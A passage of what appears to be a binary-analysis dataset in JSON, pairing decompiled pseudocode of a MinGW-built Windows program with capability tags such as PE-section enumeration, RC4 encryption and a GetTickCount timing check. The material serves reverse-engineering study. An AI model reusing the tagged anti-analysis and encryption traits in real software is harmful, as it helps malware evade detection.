            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint fcn.00491d90(uint param_1, int32_t *param_2, uint param_3, uint param_4, uchar param_5, uint param_6, \n                 ushort param_7, unkbyte10 param_8, int32_t *param_9)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *extraout_ECX;\n    uint var_40h;\n    uint var_3ch;\n    uint var_30h_5;\n    uint var_28h_2;\n    uint32_t in_stack_ffffff9c;\n    uint var_1ch_5;\n    uint var_20h_3;\n    uchar *var_30h_4;\n    uchar auStack44 [28];\n    \n    if (param_9 == NULL) {\n        uVar3 = (**(*param_2 + 8))(param_3, param_4, param_5, param_6, param_7, param_8);\n        return uVar3;\n    }\n    if (param_9[6] != 0) {\n        var_30h_4 = auStack44;\n        fcn.004b3070(*param_9, *param_9 + param_9[1] * 2, in_stack_ffffff9c & 0xffffff00);\n        uVar3 = (**(*param_2 + 0xc))(param_3, param_4, param_5, param_6, param_7, &var_30h_4);\n        if (var_30h_4 != auStack44) {\n            fcn.004c2c30(var_30h_4);\n        }\n        return uVar3;\n    }\n    uVar3 = fcn.004be210(\"uninitialized __any_string\");\n    if (var_30h_4 != auStack44) {\n        fcn.004c2c30(var_30h_4);\n    }\n    fcn.0043a8e0(uVar3);\n    iVar4 = *0x515a34;\n    *extraout_ECX = 0x52b530;\n    piVar2 = extraout_ECX[3];\n    if (iVar4 == 0) {\n        iVar4 = piVar2[1];\n        piVar2[1] = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = piVar2 + 1;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar4 == 1) {\n        (**(*piVar2 + 4))();\n    }\n    *extraout_ECX = 0x52cab0;\n    fcn.004aea30(extraout_ECX + 2);\n    fcn.004aea60();\n    uVar3 = fcn.004c2c30(extraout_ECX);\n    return uVar3;\n}\n",
        "token_count": 656
    },
    "00493b40": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl\nfcn.00493b40(uint noname_0, int32_t *arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h\n            , int32_t arg_24h)\n\n{\n    uint *var_48h;\n    uint var_40h;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    var_48h = &var_40h;\n    fcn.004b3070(arg_20h, arg_20h + arg_24h * 2, 0);\n    (**(*arg_ch + 0xc))(arg_ch, arg_14h, arg_18h, arg_1ch, &var_48h);\n    if (arg_10h[6] != NULL) {\n        (*arg_10h[6])(arg_10h);\n    }\n    *arg_10h = arg_10h + 2;\n    fcn.004b3120(var_30h, var_30h + var_2ch * 2, 0);\n    arg_10h[6] = 0x493780;\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    if (var_48h != &var_40h) {\n        fcn.004c2c30(var_48h);\n    }\n    return;\n}\n",
        "token_count": 361
    },
    "00494230": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.00494230(uint noname_0, int32_t *arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint32_t uVar1;\n    uint *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_bp_4h;\n    \n    uVar1 = 0x494256;\n    (**(*arg_ch + 0xc))(arg_ch, arg_14h, arg_18h);\n    if (arg_10h[6] != NULL) {\n        (*arg_10h[6])(arg_10h);\n    }\n    *arg_10h = arg_10h + 2;\n    fcn.004b3120(var_20h, var_20h + var_1ch * 2, uVar1 & 0xffffff00);\n    arg_10h[6] = 0x493780;\n    if (var_20h != &fcn.00494230::var_18h) {\n        fcn.004c2c30(var_20h);\n    }\n    return;\n}\n",
        "token_count": 273
    },
    "0041d89a": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __fastcall fcn.0041d89a(uint param_1)\n\n{\n    char *pcVar1;\n    uint *puVar2;\n    uint var_16ch;\n    uint var_168h;\n    uint var_14dh;\n    uint var_131h;\n    uint var_115h;\n    uint var_f9h;\n    uint var_ddh;\n    uint var_c4h;\n    uint var_a9h;\n    uint var_8dh;\n    uint var_74h;\n    uint var_59h;\n    uint var_3dh;\n    uint var_21h;\n    uint var_bp_4h;\n    \n    fcn.0041d48c(1);\n    fcn.0041d590(1, 0xde8, 0x279, *0x522d20, *0x522d20 >> 0x20, *0x522d18, *0x522d18 >> 0x20, 0);\n    fcn.0041d824();\n    fcn.00483110();\n    fcn.004b21e0(\"uwjhadcynpnvttzcxxskdhznbrlxjcmtrnjubjxlxxrfmlckwgmfhqbaesgaqzzcqljmvcdgxthymncibobfyzpmhvldnii\", \n                 &var_14dh);\n    fcn.00483110();\n    fcn.004b21e0(\"iqxsfuxnhdlxhuiuhxruxdgwaxzhqwbivfxnhueulozlpgnzwauhsolhzcmzekcagvevgh\", &var_131h);\n    fcn.0041cd78(*0x522d28, *0x522d28 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"unsxusqmljwuqqujtlmadfapwbktgircbbzqzmraevemfwkpsofpxjahypyfvqupgvihyikqjbxzlglazircoaukejydmhvi\", \n                 &var_115h);\n    fcn.00483110();\n    puVar2 = &var_f9h;\n    pcVar1 = \"kqsdkgbzoehcwmwtqhrbkpzclchwakjemqmkzciasadbcmxcvunaqyqzbwkvemdvotzvyy\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"qyqvnssqsuknl\", &var_ddh, pcVar1, puVar2);\n    fcn.0041cede(0x136e, 1, 0, *0x522d38, *0x522d38 >> 0x20, &var_f9h + 1, *0x522d30, *0x522d30 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0041cf78();\n    fcn.00483110();\n    fcn.004b21e0(\"fcwubqvdmdgvlzpksmmsuvzo\", &var_a9h);\n    fcn.0041cff0(param_1, &var_c4h);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"lspfqtpcumchcjoqjjtleijzefatwmbwzcpeifuoiuapbrfovcmogpokdrybxleyryspozfyci\", &var_8dh);\n    fcn.0041d392(0x844, &var_a9h + 1, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    pcVar1 = \"tzqwnnejxxccyxvvbslkdpvxrdgefqcbxo\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"ljwklqymaqnytstqgxlxtrbvmwozqjfzctjieutwzlxdxcwkgwdatvcbrolgfdxladedmypmxwuheqefthwyhnsukzpfwgx\", \n                 &var_3dh, pcVar1);\n    fcn.00483110();\n    fcn.004b21e0(\"sfjhjnnyalyxyglfqjmmgcv\", &var_21h);\n    fcn.0041d3ce(param_1, &var_3dh + 1, *0x522d48, *0x522d48 >> 0x20, 0, *0x522d40, *0x522d40 >> 0x20, &var_59h + 1, 1);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0041cc0e(0x7d7, 0);\n    fcn.0041ccc0(param_1, *0x522d68, *0x522d68 >> 0x20, *0x522d60, *0x522d60 >> 0x20, *0x522d58, *0x522d58 >> 0x20, 200\n                 , *0x522d50, *0x522d50 >> 0x20);\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 1376
    },
    "00448690": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00448690(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    char cVar2;\n    uint *in_ECX;\n    uint var_ch;\n    \n    fcn.00497dc0();\n    *in_ECX = 0x52b3f4;\n    fcn.00490400(arg_8h, arg_ch);\n    cVar2 = fcn.0044e030();\n    if (cVar2 == '\\0') {\n        return;\n    }\n    in_ECX[0xc] = arg_ch;\n    in_ECX[0x11] = arg_10h;\n    fcn.00496520();\n    in_ECX[5] = 0;\n    *(in_ECX + 0x49) = 0;\n    uVar1 = in_ECX[0x10];\n    in_ECX[4] = 0;\n    in_ECX[1] = uVar1;\n    in_ECX[2] = uVar1;\n    in_ECX[3] = uVar1;\n    in_ECX[6] = 0;\n    return;\n}\n",
        "token_count": 270
    },
    "004487f0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004487f0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    char cVar2;\n    uint *in_ECX;\n    uint var_ch;\n    \n    fcn.00497dc0();\n    *in_ECX = 0x52b3f4;\n    fcn.00490400(arg_8h, arg_ch);\n    cVar2 = fcn.0044e030();\n    if (cVar2 == '\\0') {\n        return;\n    }\n    in_ECX[0xc] = arg_ch;\n    in_ECX[0x11] = arg_10h;\n    fcn.00496520();\n    in_ECX[5] = 0;\n    *(in_ECX + 0x49) = 0;\n    uVar1 = in_ECX[0x10];\n    in_ECX[4] = 0;\n    in_ECX[1] = uVar1;\n    in_ECX[2] = uVar1;\n    in_ECX[3] = uVar1;\n    in_ECX[6] = 0;\n    return;\n}\n",
        "token_count": 271
    },
    "00448a20": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00448a20(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    char cVar2;\n    uint *in_ECX;\n    uint var_ch;\n    \n    fcn.00499da0();\n    *in_ECX = 0x52b434;\n    fcn.00490400(arg_8h, arg_ch);\n    cVar2 = fcn.0044e030();\n    if (cVar2 == '\\0') {\n        return;\n    }\n    in_ECX[0xc] = arg_ch;\n    in_ECX[0x11] = arg_10h;\n    fcn.004984b0();\n    in_ECX[5] = 0;\n    *(in_ECX + 0x49) = 0;\n    uVar1 = in_ECX[0x10];\n    in_ECX[4] = 0;\n    in_ECX[1] = uVar1;\n    in_ECX[2] = uVar1;\n    in_ECX[3] = uVar1;\n    in_ECX[6] = 0;\n    return;\n}\n",
        "token_count": 270
    },
    "00448b80": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00448b80(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    char cVar2;\n    uint *in_ECX;\n    uint var_ch;\n    \n    fcn.00499da0();\n    *in_ECX = 0x52b434;\n    fcn.00490400(arg_8h, arg_ch);\n    cVar2 = fcn.0044e030();\n    if (cVar2 == '\\0') {\n        return;\n    }\n    in_ECX[0xc] = arg_ch;\n    in_ECX[0x11] = arg_10h;\n    fcn.004984b0();\n    in_ECX[5] = 0;\n    *(in_ECX + 0x49) = 0;\n    uVar1 = in_ECX[0x10];\n    in_ECX[4] = 0;\n    in_ECX[1] = uVar1;\n    in_ECX[2] = uVar1;\n    in_ECX[3] = uVar1;\n    in_ECX[6] = 0;\n    return;\n}\n",
        "token_count": 270
    },
    "0044e430": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nvoid __cdecl fcn.0044e430(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t *arg_18h)\n\n{\n    uint uVar1;\n    uint32_t in_stack_ffffffb4;\n    uchar var_25h;\n    uint var_24h;\n    uint var_20h;\n    code *pcStack32;\n    code *var_ch;\n    uint var_bp_8h;\n    \n    var_ch = NULL;\n    fcn.00493900(in_stack_ffffffb4 & 0xffffff00, *(arg_8h + 0x10), &var_24h, arg_ch, arg_10h, arg_14h, *arg_18h, \n                 *(*arg_18h + -0xc));\n    if (var_ch != NULL) {\n        fcn.0048cd00(var_24h, var_20h, &var_25h);\n        if (var_ch != NULL) {\n            (*var_ch)(&var_24h);\n        }\n        return;\n    }\n    uVar1 = fcn.004be210(0x52380c);\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0043a8e0(uVar1);\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0043a8e0(uVar1);\n    fcn.0048b630(&stack0xffffffbf);\n    if (pcStack32 != NULL) {\n        (*pcStack32)(uVar1);\n    }\n    fcn.0043a8e0(&var_24h);\n    fcn.00483770(&stack0xffffffbf);\n    if (pcStack32 != NULL) {\n        (*pcStack32)();\n    }\n    fcn.0043a8e0(uVar1);\n    fcn.004aea60();\n    fcn.004c2c30(uVar1);\n    fcn.0043a8e0(&var_24h);\n    fcn.004aea60();\n    fcn.004c2c30(uVar1);\n    fcn.0043a8e0(&var_24h);\n    fcn.004aea60();\n    do {\n        fcn.004c2c30(uVar1);\n        fcn.0043a8e0(&var_24h);\n        fcn.004c2c30(uVar1);\n        fcn.0043a8e0(&var_24h);\n        fcn.00453450();\n        fcn.0048df30();\n    } while( true );\n}\n",
        "token_count": 609
    },
    "0044e5b0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nvoid __cdecl fcn.0044e5b0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h)\n\n{\n    uint uVar1;\n    int32_t *in_ECX;\n    uint32_t in_stack_ffffffb4;\n    uint *puVar2;\n    int32_t var_24h;\n    int32_t var_20h;\n    code *pcStack32;\n    code *var_ch;\n    uint var_bp_8h;\n    \n    var_ch = NULL;\n    puVar2 = &var_24h;\n    fcn.004939f0(in_stack_ffffffb4 & 0xffffff00, *(arg_8h + 0x10), &var_24h, arg_ch, arg_10h, arg_14h, *arg_18h, \n                 arg_18h[1]);\n    if (var_ch != NULL) {\n        *in_ECX = in_ECX + 2;\n        fcn.004b3070(var_24h, var_24h + var_20h * 2, puVar2 & 0xffffff00);\n        if (var_ch != NULL) {\n            (*var_ch)(&var_24h);\n        }\n        return;\n    }\n    uVar1 = fcn.004be210(\"uninitialized __any_string\");\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0043a8e0(uVar1);\n    if (pcStack32 != NULL) {\n        (*pcStack32)(&var_24h);\n    }\n    fcn.0043a8e0(uVar1);\n    if (pcStack32 != NULL) {\n        (*pcStack32)(&var_24h);\n    }\n    fcn.0043a8e0(uVar1);\n    fcn.004aea60();\n    fcn.004c2c30(uVar1);\n    fcn.0043a8e0(&var_24h);\n    fcn.004aea60();\n    fcn.004c2c30(uVar1);\n    fcn.0043a8e0(&var_24h);\n    fcn.004aea60();\n    do {\n        fcn.004c2c30(uVar1);\n        fcn.0043a8e0(&var_24h);\n        fcn.004c2c30(uVar1);\n        fcn.0043a8e0(&var_24h);\n        fcn.00453450();\n        fcn.004af570();\n    } while( true );\n}\n",
        "token_count": 597
    },
    "0044e660": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nvoid __cdecl fcn.0044e660(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t *arg_18h)\n\n{\n    uint uVar1;\n    uint32_t in_stack_ffffffb4;\n    uchar var_25h;\n    uint var_24h;\n    uint var_20h;\n    code *pcStack32;\n    code *var_ch;\n    uint var_bp_8h;\n    \n    var_ch = NULL;\n    fcn.00493b40(in_stack_ffffffb4 & 0xffffff00, *(arg_8h + 0x10), &var_24h, arg_ch, arg_10h, arg_14h, *arg_18h, \n                 *(*arg_18h + -0xc));\n    if (var_ch != NULL) {\n        fcn.00484f70(var_24h, var_20h, &var_25h);\n        if (var_ch != NULL) {\n            (*var_ch)(&var_24h);\n        }\n        return;\n    }\n    uVar1 = fcn.004be210(0x52380c);\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0043a8e0(uVar1);\n    fcn.0048b630(&stack0xffffffbf);\n    if (pcStack32 != NULL) {\n        (*pcStack32)(uVar1);\n    }\n    fcn.0043a8e0(&var_24h);\n    fcn.00483770(&stack0xffffffbf);\n    if (pcStack32 != NULL) {\n        (*pcStack32)();\n    }\n    fcn.0043a8e0(uVar1);\n    fcn.004aea60();\n    fcn.004c2c30(uVar1);\n    fcn.0043a8e0(&var_24h);\n    fcn.004aea60();\n    fcn.004c2c30(uVar1);\n    fcn.0043a8e0(&var_24h);\n    fcn.004aea60();\n    do {\n        fcn.004c2c30(uVar1);\n        fcn.0043a8e0(&var_24h);\n        fcn.004c2c30(uVar1);\n        fcn.0043a8e0(&var_24h);\n        fcn.00453450();\n        fcn.0048df30();\n    } while( true );\n}\n",
        "token_count": 574
    },
    "0044fa10": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint __cdecl fcn.0044fa10(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t *arg_1ch)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    uint32_t in_stack_ffffff78;\n    uint32_t in_stack_ffffff8c;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_34h;\n    uint var_2ch;\n    code *var_1ch;\n    uint var_bp_ch;\n    \n    var_1ch = NULL;\n    var_34h = &var_2ch;\n    fcn.004b3120(*arg_1ch, *arg_1ch + arg_1ch[1] * 2, in_stack_ffffff8c & 0xffffff00);\n    var_1ch = 0x493780;\n    uVar1 = fcn.00491c50(in_stack_ffffff78 & 0xffffff00, *(in_ECX + 8), arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, 0, \n                         &var_34h);\n    if (var_1ch != NULL) {\n        (*var_1ch)(&var_34h);\n    }\n    return uVar1;\n}\n",
        "token_count": 316
    },
    "0043d910": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0043d910(void)\n\n{\n    // WARNING: Could not recover jumptable at 0x00446eb0. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.msvcrt.dll_fopen)();\n    return;\n}\n",
        "token_count": 62
    },
    "00446eb0": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.00446eb0(void)\n\n{\n    // WARNING: Could not recover jumptable at 0x00446eb0. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.msvcrt.dll_fopen)();\n    return;\n}\n",
        "token_count": 62
    },
    "0042dcd0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0042dcd0(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if ((in_EAX == NULL) || (*in_EAX != 0x2f)) {\n        return NULL;\n    }\n    if (param_2 < 1) {\n        if (param_2 != 0) {\n            return NULL;\n        }\n    }\n    else {\n        do {\n            in_EAX = in_EAX[3];\n            param_2 = param_2 + -1;\n            if (in_EAX == NULL) {\n                return in_EAX;\n            }\n            if (*in_EAX != 0x2f) {\n                return NULL;\n            }\n        } while (param_2 != 0);\n    }\n    return in_EAX[2];\n}\n",
        "token_count": 185
    },
    "0042dd10": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0042dd10(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0x110) == 0) {\n        *(in_EAX + 0x118) = 1;\n        return NULL;\n    }\n    iVar2 = *param_2;\n    piVar1 = *(*(*(in_EAX + 0x110) + 4) + 0xc);\n    if (iVar2 < 0) {\n        return piVar1;\n    }\n    if ((piVar1 == NULL) || (*piVar1 != 0x2f)) {\n        return NULL;\n    }\n    if (iVar2 < 1) {\n        if (iVar2 != 0) {\n            return NULL;\n        }\n    }\n    else {\n        do {\n            piVar1 = piVar1[3];\n            iVar2 = iVar2 + -1;\n            if (piVar1 == NULL) {\n                return piVar1;\n            }\n            if (*piVar1 != 0x2f) {\n                return NULL;\n            }\n        } while (iVar2 != 0);\n    }\n    return piVar1[2];\n}\n",
        "token_count": 285
    },
    "0042e830": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0042e830(void)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_EAX;\n    char *pcVar5;\n    int32_t *piVar6;\n    int32_t aiStack32 [4];\n    \n    if (1 < **(in_EAX + 0xc) + 0xb7U) {\n        return 0;\n    }\n    *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n    pcVar5 = *(in_EAX + 0xc);\n    uVar4 = *(in_EAX + 0x28);\n    cVar2 = *pcVar5;\n    if (cVar2 == 'E') {\n        *(in_EAX + 0xc) = pcVar5 + 1;\n        uVar4 = fcn.0042d480(0);\n        return uVar4;\n    }\n    aiStack32[0] = 0;\n    piVar6 = aiStack32;\n    do {\n        if (cVar2 == 'L') {\n            iVar3 = fcn.0042de70();\n        }\n        else if (cVar2 < 'M') {\n            if (1 < cVar2 + 0xb7U) goto code_r0x0042e7d0;\n            iVar3 = fcn.0042e830();\n        }\n        else if (cVar2 == 'X') {\n            uVar1 = *(in_EAX + 0x30);\n            *(in_EAX + 0x30) = 1;\n            *(in_EAX + 0xc) = pcVar5 + 1;\n            iVar3 = fcn.0042dff0();\n            *(in_EAX + 0x30) = uVar1;\n            if (**(in_EAX + 0xc) != 'E') {\n                return 0;\n            }\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n        }\n        else {\ncode_r0x0042e7d0:\n            iVar3 = fcn.0042ed40();\n        }\n        if (iVar3 == 0) {\n            return 0;\n        }\n        iVar3 = fcn.0042d480(0);\n        *piVar6 = iVar3;\n        if (iVar3 == 0) {\n            return 0;\n        }\n        pcVar5 = *(in_EAX + 0xc);\n        piVar6 = iVar3 + 0xc;\n        cVar2 = *pcVar5;\n        if (cVar2 == 'E') {\n            *(in_EAX + 0x28) = uVar4;\n            *(in_EAX + 0xc) = pcVar5 + 1;\n            return aiStack32[0];\n        }\n    } while( true );\n}\n",
        "token_count": 641
    },
    "004ae810": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004ae810(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    \n    iVar3 = *(param_1 + 4);\n    if (iVar3 != 0) {\n        if (*(param_1 + 8) != 0) {\n            uVar4 = 0;\n            do {\n                piVar2 = *(iVar3 + uVar4 * 4);\n                if (piVar2 != NULL) {\n                    if (*0x515a34 == 0) {\n                        iVar3 = piVar2[1];\n                        piVar2[1] = iVar3 + -1;\n                    }\n                    else {\n                        LOCK();\n                        piVar1 = piVar2 + 1;\n                        iVar3 = *piVar1;\n                        *piVar1 = *piVar1 + -1;\n                    }\n                    if (iVar3 == 1) {\n                        (**(*piVar2 + 4))();\n                    }\n                    iVar3 = *(param_1 + 4);\n                }\n                uVar4 = uVar4 + 1;\n            } while (uVar4 <= *(param_1 + 8) && *(param_1 + 8) != uVar4);\n            if (iVar3 == 0) goto code_r0x004ae870;\n        }\n        fcn.004c2c20(iVar3);\n    }\ncode_r0x004ae870:\n    iVar3 = *(param_1 + 0xc);\n    if (iVar3 != 0) {\n        if (*(param_1 + 8) != 0) {\n            uVar4 = 0;\n            do {\n                piVar2 = *(iVar3 + uVar4 * 4);\n                if (piVar2 != NULL) {\n                    if (*0x515a34 == 0) {\n                        iVar3 = piVar2[1];\n                        piVar2[1] = iVar3 + -1;\n                    }\n                    else {\n                        LOCK();\n                        piVar1 = piVar2 + 1;\n                        iVar3 = *piVar1;\n                        *piVar1 = *piVar1 + -1;\n                    }\n                    if (iVar3 == 1) {\n                        (**(*piVar2 + 4))();\n                    }\n                    iVar3 = *(param_1 + 0xc);\n                }\n                uVar4 = uVar4 + 1;\n            } while (uVar4 <= *(param_1 + 8) && *(param_1 + 8) != uVar4);\n            if (iVar3 == 0) goto code_r0x004ae8be;\n        }\n        fcn.004c2c20(iVar3);\n    }\ncode_r0x004ae8be:\n    iVar3 = *(param_1 + 0x10);\n    if (iVar3 != 0) {\n        iVar5 = 0;\n        do {\n            if (*(iVar3 + iVar5) != 0) {\n                fcn.004c2c20(*(iVar3 + iVar5));\n                iVar3 = *(param_1 + 0x10);\n            }\n            iVar5 = iVar5 + 4;\n        } while (iVar5 != 0x18);\n        if (iVar3 != 0) {\n            fcn.004c2c20(iVar3);\n        }\n    }\n    return;\n}\n",
        "token_count": 752
    },
    "004c2c50": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004c2c50(int32_t param_1)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    if (param_1 == 0) {\n        param_1 = 1;\n    }\n    while( true ) {\n        iVar1 = sub.msvcrt.dll_malloc(param_1);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        pcVar2 = fcn.004bd650();\n        if (pcVar2 == NULL) break;\n        (*pcVar2)();\n    }\n    puVar3 = fcn.004c2d80(4);\n    *puVar3 = 0x52ccdc;\n    iVar1 = 0x528e14;\n    fcn.004c3330(puVar3, 0x528e14, fcn.004bba10);\n    if (iVar1 == 0) {\n        iVar1 = 1;\n    }\n    while( true ) {\n        iVar4 = sub.msvcrt.dll_malloc(iVar1);\n        if (iVar4 != 0) {\n            return iVar4;\n        }\n        pcVar2 = fcn.004bd650();\n        if (pcVar2 == NULL) break;\n        (*pcVar2)();\n    }\n    return 0;\n}\n",
        "token_count": 299
    },
    "004c5640": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nvoid fcn.004c5640(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    \n    uVar4 = fcn.00446f90(2);\n    sub.msvcrt.dll_fwrite(\"Mingw-w64 runtime failure:\\n\", 1, 0x1b, uVar4);\n    uVar4 = fcn.00446f90(2);\n    sub.msvcrt.dll_vfprintf(uVar4, param_1, &stack0x00000008);\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n    if (iVar2 == 0) {\n        *0x4ce004 = 0x43c000;\n        pcVar3 = 0x43bdb0;\n    }\n    else {\n        *0x56bdf0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"__register_frame_info\");\n        *0x4ce004 = (*pcVar1)(iVar2, \"__deregister_frame_info\");\n    }\n    if (pcVar3 != NULL) {\n        (*pcVar3)(0x52e0f8, 0x56b01c);\n    }\n    fcn.004014c0(fcn.00401590);\n    return;\n}\n",
        "token_count": 480
    }
}